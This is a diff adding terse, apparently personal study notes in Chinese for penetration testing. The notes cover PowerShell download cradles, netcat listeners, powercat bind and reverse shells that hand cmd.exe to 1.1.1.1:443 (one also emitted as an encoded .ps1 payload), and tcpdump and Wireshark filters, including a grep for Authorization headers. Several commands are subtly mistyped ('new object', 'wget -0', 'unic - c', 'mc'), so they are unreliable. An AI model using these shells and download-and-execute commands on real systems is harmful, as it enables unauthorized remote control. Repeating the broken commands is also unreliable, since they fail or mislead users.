@@ -1,0 +1,61 @@
+powershell
+Get-Command
+wget http://baidu.com -0 xx.exe
+"(new object System.Net.WebClient).DownloadFile('','')"
+iconv -t UTF-16LE | base64 -w 0
+Firewall
+nc -nvlp 443
+nc -nv 443
+ip addr show 
+ps aux
+whoami
+passwd
+md5sum
+
+编辑器 PowerShell ISE
+被控 Listen
+攻击机 Listen
+powercat 渗透测试框架
+..\xxx.ps1 import-Module
+powershell -c "(new object System.Net.WebClient).DownloadFile('http://xx.exe','c:\xx.exe')"
+iex (new object System.Net.WebClient).DownloadString('powercat.ps1')
+
+正向shell
+powercat -l -p 443 -e cmd.exe 被控
+mc 1.1.1.1 443 控制
+反弹
+powercat -c 1.1.1.1 -p 443 -e cmd.exe -g > xxx.ps1
+./xxx.ps1
+
+powershell -E
+
+Wireshark
+dumpcap
+
+
+sudo usermod -aG wireshark $USER 允许普通用户在所有的网卡抓包
+抓包筛选器
+net 10.0.0.0/24
+not port 80 and not port 25 and host www.wireshark.org
+tcp port http
+显示筛选器
+tcp.port == 80
+ip.addr == 1.1.1.1
+
+
+tcpdump
+
+sudo tcpdump -r xxxx.pcap 
+sudo tcpdump -r xxxx.pcap  | awk -F " " '{print $5}' |sort | unic - c  | head
+sudo tcpdump -n src host xxx.xxx.xxx.xxx -r xxx.pcap
+sudo tcpdump -n dst host xxx.xxx.xxx.xxx -r xxx.pcap
+sudo tcpdump -p xxx -r xxx.pcap
+sudo tcpdump -nX xxx.pcap
+
+二进制转换十进制
+echo "$((2#00011000))"
+sudo tcpdump -A -n 'tcp[13] = 24'  -r xxx.pcap
+
+
+|grep Authorization
+python -m http.server 80 --bind 127.0.0.1
